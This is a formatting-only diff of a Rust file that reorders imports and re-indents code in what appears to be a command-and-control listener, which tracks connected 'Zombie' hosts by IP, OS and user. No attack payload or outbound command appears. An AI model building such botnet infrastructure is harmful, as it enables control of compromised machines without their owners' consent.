@@ -1,10 +1,10 @@
-use std::{
-    io::{BufWriter, Write, BufReader, BufRead},
-    net::{TcpListener, TcpStream},
-};
-use serde::{Serialize,Deserialize};
 use flume::{Receiver, Sender};
 use s2n_quic::Connection;
+use serde::{Deserialize, Serialize};
+use std::{
+    io::{BufRead, BufReader, BufWriter, Write},
+    net::{TcpListener, TcpStream},
+};
 use tokio::select;
 pub async fn start(
     tx: Sender<String>,
@@ -25,17 +25,17 @@ pub async fn start(
                 };
             }
         };
-impl Zombie {
-    fn new(ip: String, os: String, user: String) -> Self {
-        Self { ip, os, user }
-    }
-}
+        impl Zombie {
+            fn new(ip: String, os: String, user: String) -> Self {
+                Self { ip, os, user }
+            }
+        }
     }
     Ok(())
 }
 
 fn handle_tcp_connection(
-    mut connect:  TcpStream,
+    mut connect: TcpStream,
     tx: Sender<String>,
 ) -> Result<(), Box<dyn std::error::Error>> {
     //Send notification to append connection to list.
@@ -95,4 +95,3 @@ struct Zombie {
     os: String,
     user: String,
 }
-
